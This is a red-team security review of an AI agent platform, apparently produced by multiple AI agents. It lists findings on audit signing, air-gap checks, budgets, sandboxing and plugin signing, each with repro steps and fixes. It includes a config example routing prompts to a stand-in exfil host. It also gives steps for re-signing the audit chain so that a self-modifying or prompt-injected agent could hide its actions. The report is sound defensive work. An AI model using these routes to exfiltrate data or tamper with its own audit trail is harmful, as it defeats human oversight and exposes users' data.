# Adversary Council Review

> A red-team of the whole platform. Ten adversarial "seats" attacked Lightwork
> in parallel — each from a distinct hostile lens — and every finding was then
> handed to an **independent skeptic** whose job was to *refute* it by opening
> the cited file. Only findings that survived a refutation attempt appear below.
>
> - **Date:** 2026-07-13 · **Base commit:** `f997f17` · **Branch:** `claude/adversary-council-review-6wl1f0`
> - **Agents:** 41 (10 attackers + 31 skeptics) · **Raised:** 31 · **Refuted:** 12 · **Survived:** 19
> - **Survivors:** 12 CONFIRMED / 7 PLAUSIBLE — **1 critical, 3 high, 6 medium, 9 low**

## How to read this

Every survivor was verified against source. The **Skeptic** line on each finding
is the adversarial verifier's verdict — where a skeptic corrected an inflated
severity or dropped an over-reaching sub-claim, that correction is folded in and
the severity shown is the *corrected* one. Twelve findings the council raised were
**killed** by skeptics (see [What the council refuted](#what-the-council-refuted))
— that list matters as much as the survivors, because it shows the governance
machinery that *does* hold under attack.

**Headline.** The platform's engineering is genuinely strong — the offensive-security
and kernel-rule seats came back nearly empty, and multiple "governance is fake"
findings were refuted because the runtime guards really do fail closed. The damage
is concentrated in a different place: **the gap between what the customer-facing
governance/marketing surface promises and what the *default* (non-enterprise)
configuration actually enforces.** The single critical finding, all three highs,
and several mediums are variations on that one theme.

---

## Findings at a glance

| # | Sev | Verdict | Seat | Finding | Location |
|---|-----|---------|------|---------|----------|
| 1 | **Critical** | CONFIRMED | governance | "Signed, tamper-evident learning audit" is self-signed with a co-located key by default | `audit/signing.py:485` |
| 2 | **High** | CONFIRMED | budget/billing | Per-tenant daily spend ceiling is not enforced under concurrency | `budget.py:548` |
| 3 | **High** | CONFIRMED | privacy/air-gap | `airgap check` trusts the provider *name*, not the resolved URL — off-box exfil passes clean | `air_gap.py:34` |
| 4 | **High** | CONFIRMED | claims | "Fault-injected at 1,000,000 iterations" is fabricated (real: 3 packs / 2,000 iters) | `docs/enterprise/security-overview.md:44` |
| 5 | Medium | CONFIRMED | security | Devcontainer sandbox ships network-ON + in-container-root against a writable host mount | `sandbox/devcontainer.py:159` |
| 6 | Medium | CONFIRMED | privacy/air-gap | `airgap check` is blind to telemetry sinks (Sentry DSN, SIEM forwarder) | `air_gap.py:19` |
| 7 | Medium | CONFIRMED | supply-chain | Plugin code-signing manifest hashes only `.py` — native `.so`/data escape the signature | `plugins.py:407` |
| 8 | Medium | CONFIRMED | api/dashboard | `/healthz` over-shares on OIDC/SSO deployments (redaction gates on the static token) | `app.py:5186` |
| 9 | Medium | CONFIRMED | reliability | Circuit breaker is observe-only — OPEN state is never enforced; `diag circuits` implies it is | `llm.py:386` |
| 10 | Medium | CONFIRMED | reliability | Snapshot rollback never deletes files a patch *added* — "reversible" self-mod leaves orphans | `workspace_snapshot.py:175` |
| 11 | Low | PLAUSIBLE | security | Reverse-proxy SSO trusts a spoofable `X-Forwarded-User` from any loopback peer (non-enterprise) | `proxy_auth.py:53` |
| 12 | Low | PLAUSIBLE | kernel-rules | Shield scan-error fail direction is inconsistent (MCP fails open, federation fails closed) | `mcp_tools.py:138` |
| 13 | Low | PLAUSIBLE | data-integrity | "Exactly-once" is at-least-once on the reclaim path; the CI soak gate never exercises it | `job_queue.py:313` |
| 14 | Low | CONFIRMED | data-integrity | CLI cron re-arms exactly once; a swallowed transient error kills the schedule forever | `worker.py:178` |
| 15 | Low | PLAUSIBLE | supply-chain | Plugin permission manifest is self-asserted, not runtime-enforced; default isolation is `none` | `plugins.py:301` |
| 16 | Low | PLAUSIBLE | supply-chain | Default content-trust fails open — skill bodies reach the prompt unscanned/unsigned | `catalog_trust.py:126` |
| 17 | Low | PLAUSIBLE | reliability | DR restore is not crash-consistent — a kill mid-restore can leave a torn `world.db` | `backup.py:278` |
| 18 | Low | PLAUSIBLE | claims | Firecracker listed as a shipped v0.1 backend, but its exec path never mounts the workspace | `sandbox/firecracker.py:189` |
| 19 | Low | CONFIRMED | claims | README headline `pipx install maverick-agent` cannot succeed — packages aren't published | `README.md:32` |

**The through-line:** #1, #2, #3, #4, #6, #8, #11, #16 are all the *same shape* — a
guarantee that is real in enterprise mode but degraded, opt-in, or absent in the
shipped default, while a customer-facing surface presents it as inherent. Fixing
the "secure-by-default vs. enterprise-gated" posture closes most of this report.

---

## Critical

### 1 — The "signed, tamper-evident learning audit" is self-signed with a co-located key by default
**`packages/maverick-core/maverick/audit/signing.py:485-539, :981-1112` · CONFIRMED (high confidence)**

In the default and every non-enterprise deployment, the Ed25519 audit-signing
**private** key is generated and written to local disk at `~/.maverick/audit/keys/<id>.key`
(`_save_keypair`, `os.open(..., 0o600)`), readable by the same uid that runs the
agent. `require_offhost_signing()` raises only under enterprise mode — otherwise
`_load_or_create_keypair` falls straight through to generate-and-save locally. So
the party whose actions the chain is meant to make non-repudiable **holds the key
that signs it**. `verify_chain(pubkey_hex=None)` then trusts the co-located `.pub`,
and the module ships `reanchor_file(...)` — a built-in rewrite-and-re-sign-the-whole-chain
primitive whose own docstring concedes it "is not extra protection against an attacker
who already holds that key." The flagship proof verifies with the *same* key it just
signed with (`proof_guarantees.py:145`) and ships a green "Tamper-evident audit ledger"
badge; `PROOF.md` reads "signed (Ed25519)."

- **Impact.** Every governance/learning event — promotions, egress blocks, consent
  decisions, the audit ledger a diligence team is told to trust — can be edited and
  cleanly re-signed by anything running as the maverick uid: a prompt-injected or
  self-modifying agent (*the platform's own threat model*), a local operator, or root.
  The control fails against precisely the adversary it is sold to defend against, in
  the default configuration, via a built-in primitive.
- **Repro.** Default install → let the agent write audit rows (key auto-generates) →
  as the same user, edit any row in `~/.maverick/audit/<day>.ndjson` → recompute the
  hash/sig chain with the local `.key` (or call `reanchor_file(preverified=True)`) →
  `maverick audit verify` returns a clean chain.
- **Skeptic.** *"I tried to refute this and could not. Every cited claim is accurate."*
  Checked every compensating control — WORM is opt-in/default-off and only seals
  *closed* day-files; the anchor ledger is signed with the same local key; SIEM
  forwarding isn't a default immutable sink. None engages by default. Kept at critical:
  honest docstrings disclose the limitation, but the buyer reading the green
  "signed (Ed25519)" badge never sees them, and off-host custody is enterprise-gated.
- **Fix.** Make `require_offhost_signing()` default ON whenever audit signing is on
  (secure-by-default), *or* have `PROOF.md`/`proof_guarantees` downgrade the guarantee
  to "integrity vs. non-privileged edits only" and require an externally-held trusted
  pubkey before emitting any tamper-evidence claim. Verify with an off-host anchor,
  never the embedded key.

---

## High

### 2 — Per-tenant daily spend ceiling is not enforced under concurrency
**`packages/maverick-core/maverick/budget.py:548-584` · CONFIRMED (high confidence)**

`_clamp_to_tenant_remainder` reads the tenant's remaining daily allowance **once at
run start** (`tenant_remaining_today(current_tenant())`) and clamps `max_dollars` to
it — but the usage ledger is *written once, at run end*. Every `_record_quota_usage()`
call site fires only at goal finalization, and the start-of-run gate
`tenant_over_quota()` reads the same end-of-run ledger. The code's own docstring
positions this cap as the "Highest precedence" "billing guarantee" that "overrides
even an explicit `--max-dollars`" — and, three lines later, admits the concurrency hole.

- **Impact.** In a multi-tenant hosted deployment (the exact deployment this cap
  exists for), a tenant with a `$100/day` ceiling that launches N goals near-simultaneously
  gets N runs each clamped to `~$100`, for up to `~$N×100` of real, unapproved provider
  spend. The overshoot is bounded by concurrent-run count, not unbounded — but a
  reviewer reads an in-code admission that a "billing guarantee" isn't guaranteed.
- **Repro.** Tenant `T`, `max_daily_dollars=100`, `$0` spent → start 5 goals for `T`
  concurrently → each reads `tenant_spend_today()=0`, each clamps to `$100` → `~$500`
  against a `$100` cap.
- **Skeptic.** Traced the full read/write cycle; no live re-check exists in `check()`
  or `record_tokens()`, and no dollar-denominated reservation exists anywhere. Kept
  at high (not critical): requires the opt-in per-tenant cap; single-run and
  between-run cases *are* enforced.
- **Fix.** Reserve/settle on the tenant ledger: atomically reserve the run's
  `max_dollars` at start and reconcile at end, *or* re-check live tenant spend inside
  `Budget.check()`. Until then, don't call the tenant cap a "guarantee" in operator docs.

### 3 — `maverick airgap check` blesses off-box exfiltration (trusts the provider name, not the URL)
**`packages/maverick-core/maverick/air_gap.py:34-45` · CONFIRMED (high confidence)**

The air-gap audit decides model locality purely from the provider prefix
(`is_local(spec)` → `_provider_of(spec) in LOCAL_PROVIDERS`) and never inspects the
endpoint the provider will dispatch to. The built-in "local" providers
(`ollama`/`vllm`/`tgi`/`local`) all accept an operator-supplied `base_url` that can
point anywhere. A config routing every role to `ollama:...` with
`[providers.ollama] base_url = "https://exfil.example.com/v1"` is reported **air-gap
CLEAN** while every prompt leaves the box. The platform already ships the correct,
endpoint-validating check (`enterprise._builtin_local_provider_is_local`, used by the
enterprise egress lock) — the air-gap tool just doesn't use it.

- **Impact.** A regulated/classified deployment runs `maverick airgap check`, gets
  exit 0 / "clean," and trusts the box — while full prompts (customer PII, proprietary
  data) are POSTed off-box. The audit gives a false negative on the single failure it
  exists to catch. *Empirically confirmed*: the skeptic ran `air_gap.audit()` with
  every role → off-box ollama + deny-all egress + network-off sandbox and got
  `{'clean': True, 'violations': []}`.
- **Skeptic corrections (folded in).** Two sub-claims dropped: (a) redaction is *not*
  also bypassed — `maybe_redact_egress` uses the endpoint-validating check, so an
  off-box provider's prompt *is* redacted when redaction is on; (b) the repro must
  route *every* role to a name-local provider (a single role leaves others at
  anthropic and gets flagged). Core defect stands; the airgap CLI never requires or
  implies enterprise mode, so it's a real standalone gate emitting a false clean.
- **Fix.** Have `air_gap._audit_providers` resolve each role's effective endpoint and
  reuse `enterprise.is_local_provider` (validates `base_url`/`VLLM_BASE_URL`/`TGI_BASE_URL`
  are loopback/private). Collapse the two divergent locality checks into the strict one.

### 4 — "Fault-injected at 1,000,000 iterations" is fabricated
**`docs/enterprise/security-overview.md:44` vs `tests/test_hard_refusals_invariant.py:62` · CONFIRMED (high confidence)**

Enterprise diligence, the security overview, the handbook, the safety-steering-group
doc, the architecture doc, the shield README, the CHANGELOG, **and the buyer-facing
competitive comparison table** all state the six governance invariants are "each
fault-injected at 1,000,000 iterations." The code: the hard-refusals invariant
fault-injects over **exactly 3 packs** (`for name in (_NAMES[0], _NAMES[len//2], _NAMES[-1])`);
the budget-cap sweep is `for _ in range(2000)`; the other four invariants have **no
fault-injection loop at all**. The largest fuzz loop anywhere in the suite is
`range(5000)`. The only literal `1000000` in code is an unrelated opt-in
learning-efficacy soak (default 20,000) and a token-cap *value*.

- **Impact.** A reviewer who asks to reproduce the headline governance claim finds
  the real numbers off by ~200× (budget) to ~333,000× (refusals: 3 vs 1,000,000).
  The invariants themselves are genuine and roster-wide — the "1,000,000 iterations"
  is marketing fiction bolted onto real work, sitting in the diligence packet and the
  competitive table, on the central "governance you can prove" pillar. This is exactly
  the specific, checkable claim that becomes a credibility-collapse moment in the room.
- **Skeptic.** Every doc/code line verified; no charitable aggregate reaches 1M; the
  docs say "each," not "aggregate"; the invariant tests have no env-scaling knob. This
  is a claims-integrity defect, not a runtime vuln — but high because it's a fabricated,
  falsifiable quantitative proof-claim in buyer-facing materials.
- **Fix.** Delete "1,000,000 iterations" everywhere; replace with the true, still-strong
  framing: "each invariant verified across all 2,020 packs with a non-vacuous
  fault-injection control (property-fuzzed up to 5,000 iterations)."

---

## Medium

### 5 — Devcontainer sandbox ships weaker isolation than the DockerBackend it claims parity with
**`packages/maverick-core/maverick/sandbox/devcontainer.py:159, 206, 222` · CONFIRMED**

Every other container backend defaults **network-off** (`--network none`) and
**non-root** (`--user uid:gid`). Devcontainer inverts both: `allow_network=True` by
default, and it only passes `--user` when `remoteUser != "root"` — so with the spec's
default `remoteUser="root"` the agent runs as root inside the container, writing to
`{project_dir}:{workspace}` bind-mounted from the host. A prompt-injected agent gets
a live egress channel *and* can write root-owned files across the mounted repo
(overwrite `.git/hooks/`, CI config, `.env`). `--cap-drop ALL` doesn't help — writing
to a bind mount needs no capability. Kept at medium: the root half needs a
`devcontainer.json` that omits `remoteUser` (official images set `vscode`), and
network-on is a documented choice — but the docstring claims parity the defaults don't deliver.
**Fix:** default `allow_network=False` and pin the invoking uid:gid unless the operator explicitly opts into root.

### 6 — Air-gap audit is blind to every telemetry/forwarding sink
**`packages/maverick-core/maverick/air_gap.py:19-31` · CONFIRMED**

`audit()` inspects only providers, the `[egress]` deny list, and the sandbox — never
`[observability] sentry_dsn` or `[audit] siem_dest`, both of which live in the same
config dict and open real outbound connections (`sentry_sdk.init(dsn=...)` auto-fires
on the first trace span; the SIEM forwarder `urllib.request.urlopen`-POSTs rendered
audit events to any host). Crucially, `deny=["*"]` does **not** mitigate at runtime —
those sinks open sockets directly and never consult the egress policy. An operator can
pass `airgap check` clean while a configured Sentry DSN ships stack traces (with GenAI
+ agent-description attributes) off-box, or the SIEM forwarder streams the audit log
to an off-site collector. *Skeptic correction:* Prometheus is an inbound 127.0.0.1
listener (not egress) and OTEL is env-var-driven (invisible to a config audit) — the
confirmable config-visible false-negatives are `sentry_dsn` and `siem_dest`.
**Fix:** add an `_audit_telemetry` pass flagging a non-empty `sentry_dsn`, any `siem_dest`, and configured webhook URLs.

### 7 — Plugin code-signing manifest hashes only `.py` files
**`packages/maverick-core/maverick/plugins.py:407-408` · CONFIRMED**

Under `[plugins] require_signing` (forced on in enterprise mode), the plugin CA is the
hard gate deciding whether plugin code executes — but `_ep_importable_files` admits
only `.py` files into the signed manifest. An attacker with write access to the
plugin's install dir (the exact tamper scenario signing claims to defend) can plant or
replace a malicious native extension (`.so`/`.pyd`), `.pth`, or data file that a signed
`.py` imports; `_plugin_signature_ok` recomputes the `.py`-only manifest from disk, it
still matches the signed bundle, and the plugin loads. Result: **native code execution
under a plugin the operator believes is cryptographically verified.** The only
uncertainty is ecosystem-level (does a given plugin ship a native ext) — a normal
configuration, not a stretch.
**Fix:** hash all distribution files under the package root (at minimum `.py/.pyc/.so/.pyd/.pth/.dylib` + declared data), and fail closed if the on-disk file set contains entries not covered by the signed manifest.

### 8 — `/healthz` over-shares on OIDC/SSO deployments
**`packages/maverick-dashboard/maverick_dashboard/app.py:5186` · CONFIRMED**

The health-payload redaction gates only on `os.environ.get("MAVERICK_DASHBOARD_TOKEN")`.
The platform treats the static token, OIDC, and reverse-proxy SSO as three independent,
mutually-exclusive auth mechanisms — so an OIDC-only or proxy-SSO enterprise deployment
(the platform's target) runs with the token unset, the redaction never fires, and the
auth-exempt `/healthz`+`/readyz` return the full checks block: `llm_key` status, live
in-flight concurrency gauge, and on `/readyz` the shield/agent_trust/client_binding
posture. On a DB failure the payload emits `f"fail: {type(e).__name__}: {e}"` — leaking
the absolute DB path/OS username (or the Postgres DSN). The code's own comment labels
this a "Council security finding"; the deliberately-built redaction is defeated in the
exact deployment mode the platform targets.
**Fix:** gate redaction on *any* configured auth mechanism (`oidc_enabled() or proxy_auth_enabled() or token`), not just the static token.

### 9 — Circuit breaker is decorative — OPEN state is never enforced
**`packages/maverick-core/maverick/llm.py:386-395` · CONFIRMED (severity corrected high→medium)**

The platform ships a full three-state per-provider `CircuitBreaker` whose docstring
promises "fail fast (no 30-second timeouts on every call) AND don't hammer the dead
service." But the only production caller, `_feed_circuit`, is explicitly *observe-only*
— it records `record_failure()`/`record_success()` in a `finally` block *after* the
call already dispatched, and nothing ever consults `br.state` to short-circuit. The
`call()`/`CircuitOpen`/`.state` enforcement API is exercised only by tests. Worse,
`maverick diag circuits` prints `llm:anthropic: open` to operators during an incident,
implying live protection that doesn't exist, and `soc2-controls.md` cites the module as
the operative CC7.2/CC7.4 control. On a default single-provider deployment (failover is
opt-in/off), a provider brown-out means every agent keeps blocking on the dead provider.
*Skeptic:* real governance gates (budget, egress lock, preflight) all enforce
*before* dispatch and are intact — so this is an SRE/audit-accuracy gap, not a
security/governance bypass. Hence medium, not high.
**Fix:** either enforce the breaker on dispatch (wrap `client.complete` in `br.call(...)` so OPEN fast-fails), or delete the module and relabel `diag circuits` so operators aren't shown an enforcement surface that doesn't enforce.

### 10 — Snapshot rollback never removes files a patch *added*
**`packages/maverick-core/maverick/workspace_snapshot.py:175-223` · CONFIRMED**

`restore_snapshot` only ever *writes* (`tar.extract` over the destination) — there is
no pass that deletes tree entries missing from the archive. So reverting a
self-modification that **added** a new file leaves that file on disk, yet
`revert_change` returns `True` and the audit chain records a completed rollback. The
tree is not byte-identical to the snapshot the "mechanically reversible" claim asserts.
`apply_change` snapshots *before* applying, so an additive patch's snapshot lacks the
new file; the standard tree-revert idiom elsewhere (`git reset --hard && git clean -fd`)
*would* remove it — this path deliberately doesn't use it. Blast radius is bounded
(self-mod off by default; the code rung needs a human Ed25519 signature), and the
orphan is usually unreferenced dead code — but the reliably-confirmed harm is the
**governance/audit-integrity gap**: revert reports full success while the working tree
differs from the snapshot.
**Fix:** reconcile the destination against the archive member set and delete orphan files (and empty dirs) under the same `_is_within` guards, and add an add-then-revert test.

---

## Low

These are real and correctly located, but each is bounded by an opt-in precondition,
a documented caveat, a default-off posture, or purely documentation impact.

- **11 — Reverse-proxy SSO trusts spoofable `X-Forwarded-User` from any loopback peer**
  (`proxy_auth.py:53` · PLAUSIBLE). When proxy auth is enabled (opt-in) but
  `trusted_proxies` isn't pinned, `proxy_trusts()` falls back to trusting every loopback
  client and maps the raw header to `user:<value>` — a co-located container or an
  SSRF-to-127.0.0.1 that can inject a header could assert admin. **Downgraded from high**
  by the skeptic: opt-in, industry-standard SSO trust model, auto-disabled under
  enterprise/`client_binding_enforced()`, flagged by `maverick doctor`, and exploitation
  needs a compounding co-located-attacker or header-injecting-SSRF primitive.
  **Fix:** require a pinned `trusted_proxies` in *all* modes, or gate the loopback fallback behind an explicit `trust_loopback=true`.

- **12 — Shield scan-error fail direction is inconsistent** (`mcp_tools.py:138` vs
  `shield_policy.py:76` · PLAUSIBLE). A present-but-erroring shield fails **open** on
  the MCP tool-metadata path (`return True`) but **closed** on federation/A2A. Genuine
  defense-in-depth inconsistency, but the exploit (a hostile MCP server reliably
  triggering a scan exception via schema metadata) is unproven — the real Shield's
  detectors fail open *internally*, so content-driven exceptions are absorbed, and the
  one attacker-controllable pathology (depth bomb) already fails closed.
  **Fix:** pick one scan-error policy for content-admission chokepoints (fail-toward-the-gate is the defensible default) via a single shared flag.

- **13 — "Exactly-once" is at-least-once on the reclaim path** (`job_queue.py:313` ·
  PLAUSIBLE). `reclaim_stale()` requeues `running→pending` without bumping `attempts`,
  so a live-but-*frozen* worker (SIGSTOP/live-migration past the lease) can have its job
  re-claimed and its side effects (LLM spend, world-model goal rows) run twice; DB-row
  fencing makes only the *terminal write* a no-op. The CI soak gate that prints
  `exactly_once_under_contention` never calls `reclaim_stale`, so it proves `claim()`
  atomicity, not exactly-once. **Skeptic correction:** a live-but-*slow* worker *is*
  tested and protected by the heartbeat (`test_live_worker_heartbeat_prevents_lease_steal`);
  the residual is the standard lease-scheme limitation at the default 3600s lease.
  **Fix:** rename/caveat the metric (claim-atomicity ≠ side-effect idempotency), and add idempotency keys at the side-effect boundary if stronger guarantees are wanted.

- **14 — CLI cron re-arms exactly once; a swallowed error kills the schedule forever**
  (`worker.py:178` · CONFIRMED). `_maybe_rearm` enqueues the next occurrence only when
  `attempts==1` and wraps the enqueue in a bare `except` that only logs — so a single
  transient `database is locked` permanently and silently kills a CLI-created recurring
  schedule (ends as a `done` row, no dead-letter, no `counts()` signal).
  **Scoped by skeptic:** only affects `maverick schedule goal`/`add`; dashboard-managed
  automations (flows, dreaming, assessments) are idempotently re-seeded by `reconcile()`
  and self-heal. **Fix:** persist the re-arm as a durable retryable step and surface failures as a `failed` row.

- **15 — Plugin permission manifest is self-asserted, not runtime-enforced**
  (`plugins.py:301` · PLAUSIBLE). A manifest-less plugin trips no permission violation,
  and default isolation is `none`, so a granted plugin's import/factory code runs
  in-process with full host capability. **Reframed by skeptic** from a false-assurance
  defect to "declarative manifest is advisory metadata, not a sandbox": the real gate is
  the explicit per-plugin allowlist plus, in enterprise mode, forced signature
  verification + subprocess isolation — all intact, and the manifest is honestly
  documented as warning-level. **Fix:** map declared permissions to real runtime confinement, or state in operator docs that the grant isn't enforced.

- **16 — Default content-trust fails open** (`catalog_trust.py:126` · PLAUSIBLE). With
  the (optional) shield extra absent and default config, a user-initiated catalog
  install performs no content scan and no signature verification (sha256-TOFU against an
  unauthenticated GitHub-hosted index), and the `ImportError` branch fails open
  **silently** rather than with the warning its docstring and kernel rule 1 promise.
  **Skeptic:** MITM is ruled out (https-only enforcement), there's no auto-install path,
  and a full opt-in hardening path exists (`require_signed_catalog`/`trusted_pubkeys`).
  **Fix:** add the promised `log.warning` to the `ImportError` branch, and default `require_signed_catalog` on for production profiles.

- **17 — DR restore is not crash-consistent** (`backup.py:278` · PLAUSIBLE). Restore
  writes each file straight into the live root with `dst.write_bytes(...)` — no
  temp+rename, no fsync — and for a `.db` it unlinks the `-wal`/`-shm` sidecars *first*,
  so a kill mid-write leaves a torn, unopenable database with no WAL to recover from.
  The *create* path is deliberately crash-safe (fsync + `os.replace`); restore isn't.
  **Skeptic:** restore is idempotent and re-runnable from the (crash-safe, unmodified)
  tarball, so "bricked" is contrived. **Fix:** mirror the create path — write to `.part`, fsync, `os.replace`, and delete DB sidecars only after the new `.db` is durable.

- **18 — Firecracker listed as a shipped v0.1 backend but its exec path never mounts the workspace**
  (`sandbox/firecracker.py:189` · PLAUSIBLE). `_firectl` builds kernel/root-drive args
  and `/bin/sh -c cmd` with no bind-mount/vsock/9p share of `self.workdir`, so a
  file/test goal runs against a blank rootfs. **Corrected by skeptic:** the module is
  loudly self-labeled `SCAFFOLD`, commands fail *visibly* (not silently-wrong), the path
  is triple-guarded and fails closed without `firectl`+images, and there's **no isolation
  weakness** — when reached, the microVM containment is intact. It's a docs/expectations
  mismatch. **Fix:** move Firecracker to the Planned/EXPERIMENTAL column until workspace transfer is implemented.

- **19 — README headline `pipx install maverick-agent` cannot succeed** (`README.md:32`
  · CONFIRMED). The first quickstart command installs a package the same README's Status
  paragraph admits "are not on the public index yet" (PyPI is listed under Planned). A
  copy-paste evaluator hits a self-refuting first impression. **Fix:** make the source/installer path the headline until the first tagged release publishes to PyPI.

---

## What the council refuted

Twelve raised findings were **killed by skeptics** who opened the file and found the
attack didn't hold. This is the load-bearing half of the review — it maps the
governance machinery that *does* survive adversarial probing:

| Seat | Refuted claim | Why it died |
|------|---------------|-------------|
| kernel-rules | `$0` budget cap for `codex_cli`/self-hosted providers is "inert" | `$0` is *correct* accounting — codex_cli is subscription-metered, self-hosted has no per-token invoice; the short-circuit is deliberate. |
| governance | Self-improvement human-approval interlock is a self-settable boolean | Real mechanism, but signing-enforced mode provisions approver keys; the boolean path is the documented non-enforced default, not a bypass of an active control. |
| governance | "Immutable evaluator anchors" govern an empty set + fail open | `verify_anchor_integrity()` is a **real runtime guard** in the promotion path that fails **closed** on checksum mismatch — the empty default is a clean no-op, not a laundering path. |
| governance | "Immutable" migrations/anchors have no runtime enforcement | False for anchors — enforced at runtime in `consider_promotion`, failing closed. |
| governance | Calibration freeze ("single most important guardrail") is defaulted off | Mechanics accurate, but the net interlock behavior was not the vacuous pass the finding claimed. |
| data-integrity | `claim()` reports a busy queue as empty, dropping ready jobs | The guarded `UPDATE ... WHERE status='pending'` is a correct atomic transition; `drain()` behavior on a lost race is benign. |
| budget/billing | Non-USD invoices are mis-totaled (no FX conversion) | Real code gap, but no non-USD rate card is a shipped configuration; USD-default path is correct. |
| budget/billing | `reserve()` overshoot-guard defeated by `chars/4` estimator | Output tokens are counted at true cost post-hoc; the "several multiples past cap" impact isn't reachable. |
| privacy/air-gap | Agent `description` exported to telemetry unscrubbed | Real omission, but every production caller path doesn't reach it with model-controlled data. |
| supply-chain | MCP `skill_install` bypasses REST's admin RBAC + opt-in | Parity gap is real, but the MCP transport's own auth/clamping constrains the exposure. |
| reliability | Per-principal semaphore registry grows unbounded | No eviction is real, but the key space is bounded and not adversarially user-driven in practice. |
| claims | Proof suite's "no mocks" banner sits above stubbed proofs | The tamper-evidence/guarantee framing checks out; the "reframes a 3-line fixture" characterization was false. |

> Note the pattern: the **hard runtime gates hold** (queue atomicity, anchor integrity,
> budget counters, egress lock in enterprise mode). What repeatedly breaks is the
> **default-vs-enterprise posture and the marketing surface**, not the enforcement code.

---

## Seat-by-seat verdicts

- **Offensive Security** — *"Among the most defensively-engineered codebases of this
  size I have reviewed."* Sandbox backends drop all caps + no-new-privileges +
  network=none + non-root; SSRF guard pins the resolved IP and re-validates redirects;
  OIDC is asymmetric-only; webhooks fail closed with `compare_digest` + replay dedup;
  at-rest crypto is AES-256-GCM with `O_EXCL` keys; no `pickle`/`yaml.load`/`os.system`
  in product paths. Only weaknesses: two secure-by-default gaps in opt-in features (#5, #11).
- **Kernel-Rule Compliance** — Healthy. All six invariants enforced, most with inline
  comments citing the rule they uphold. No true violation; the two items (#12 low) are
  documented design choices.
- **Governance Theater** — The seat that drew blood (#1 critical). The differentiators
  are real code, but in the shipped default their **trust anchors are co-located,
  opt-in, or empty** while the product surface presents them as inherent. Several
  sub-claims were refuted because the runtime guards *do* fail closed.
- **Data Integrity & Concurrency** — Unusually well-hardened (correct `claim()` atomic
  transition, conditional cross-process UPDATEs, forward-only idempotent migrations with
  pre-migration backup). The gap is a **broken proof**, not a broken query — "exactly-once"
  is under-proven on the reclaim path (#13), plus a narrow CLI-cron reliability gap (#14).
- **Financial Controls** — Per-*run* spend machinery is excellent (atomic locked
  counters, check-inside-lock, HMAC-hash-chained receipts, provider-usage-accurate token
  accounting). The weakness is one axis up: the per-*tenant* cap isn't concurrency-safe (#2).
- **Privacy, PII & Air-Gap** — At-rest encryption is genuinely on-by-default and
  fail-closed; federated exchange is opt-in with client-side scrubbing. The problem is
  the **air-gap proof itself** is weaker than the enterprise egress lock (#3, #6).
- **Supply Chain & Trust** — Signing/trust framework is real and wired; the gaps are a
  manifest that under-covers the file set (#7) and default-off/advisory postures (#15, #16).
- **Web/API Attack Surface** — Mostly closed (correct CSRF same-origin gate, DNS-rebind
  Host check, loopback-only no-token mode). One real over-share in the OIDC/SSO default (#8).
- **Reliability & Failure Modes** — A decorative circuit breaker (#9), a non-restoring
  rollback (#10), and a non-crash-consistent restore (#17) — resilience *surfaces* that
  don't deliver what they advertise, though core governance gates enforce before dispatch.
- **Claims-vs-Reality** — A fabricated diligence metric (#4 high), plus doc/marketing
  mismatches (#18, #19). The underlying engineering is real; the *claims* out-run it.

---

## Recommended sequence

1. **#1 (critical) + #4 (high)** — the two that detonate in an enterprise security
   review: make off-host audit signing the secure default (or stop calling the
   co-located path "tamper-evident"), and delete the fabricated "1,000,000 iterations"
   from every buyer-facing surface. Both are days of work, not weeks.
2. **#3, #6, #8** — one theme: make the default posture match the enterprise posture, or
   make the checks (`airgap check`, `/healthz` redaction) as strict as the runtime lock.
3. **#2** — reserve/settle the tenant spend ledger so the "billing guarantee" is one.
4. **#5, #7, #9, #10** — sandbox defaults, signature coverage, breaker enforcement, and
   true rollback: each closes a "the mechanism doesn't do what the label says" gap.
5. **Low tier** — batch as hardening/doc-honesty cleanup.

## Method & caveats

- **Fan-out.** 10 adversarial seats attacked in parallel (each with a distinct hostile
  charter + repo map), then a `pipeline` handed **each finding to an independent skeptic**
  prompted to *refute* it — open the cited file, assume the claim is wrong until the code
  forces agreement, default to REFUTED when uncertain, and correct inflated severities.
  Only non-refuted findings appear above. 41 agents, 0 errors, ~3.2M tokens.
- **Scope.** Source-level adversarial review of the checked-out tree at `f997f17`. No
  code was executed against a live deployment except a skeptic's local `air_gap.audit()`
  reproduction (#3). Runtime-only issues (load behavior, live races under real
  concurrency) are reasoned from code, not observed end-to-end.
- **Confidence.** CONFIRMED = a skeptic opened the file and the defect is exactly as
  described and reachable. PLAUSIBLE = mechanism verified but the exploit/impact depends
  on an external precondition the code alone can't establish. Treat PLAUSIBLE findings as
  "worth a targeted runtime test," not settled.
